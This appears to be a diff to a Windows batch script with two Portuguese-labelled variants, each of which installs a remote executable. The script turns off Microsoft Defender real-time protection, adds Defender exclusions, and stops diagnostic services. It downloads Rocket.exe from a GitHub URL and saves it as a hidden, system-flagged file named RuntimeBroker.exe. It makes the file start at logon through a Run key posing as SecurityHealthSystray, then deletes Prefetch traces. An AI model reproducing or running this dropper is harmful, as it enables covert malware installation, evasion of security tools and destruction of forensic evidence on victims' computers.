@@ -1,3 +1,5 @@
+PC ACEITA WINDOWS APP
+
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
 powershell -Command "Add-MpPreference -ExclusionProcess 'RuntimeBroker.exe'" 2>nul
 powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\WindowsApps'" 2>nul
@@ -6,6 +8,23 @@ curl -L -o "%TEMP%\RuntimeBroker.exe" "https://raw.githubusercontent.com/V3xDev/
 move /Y "%TEMP%\RuntimeBroker.exe" "%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe"
 attrib +S +H "%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealthSystray" /t REG_SZ /d "\"%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe\"" /f
+del /q "C:\Windows\Prefetch\CMD*.pf" 2>nul
+del /q "C:\Windows\Prefetch\CURL*.pf" 2>nul
+del /q "C:\Windows\Prefetch\RUNTIMEBROKER*.pf" 2>nul
+net start DiagTrack & net start DPS & net start SysMain & net start WSearch & net start PcaSvc
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul
+
+-----------------------
+
+PC RECUSA WINDOWS APP
+
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
+powershell -Command "Add-MpPreference -ExclusionProcess 'RuntimeBroker.exe'" 2>nul
+powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft'" 2>nul
+net stop DiagTrack /y & net stop DPS /y & net stop SysMain /y & net stop WSearch /y & net stop PcaSvc /y
+curl -L -o "%LOCALAPPDATA%\Microsoft\RuntimeBroker.exe" "https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
+attrib +S +H "%LOCALAPPDATA%\Microsoft\RuntimeBroker.exe"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealthSystray" /t REG_SZ /d "\"%LOCALAPPDATA%\Microsoft\RuntimeBroker.exe\"" /f
 del /q "C:\Windows\Prefetch\CMD*.pf" 2>nul
 del /q "C:\Windows\Prefetch\CURL*.pf" 2>nul
 del /q "C:\Windows\Prefetch\RUNTIMEBROKER*.pf" 2>nul
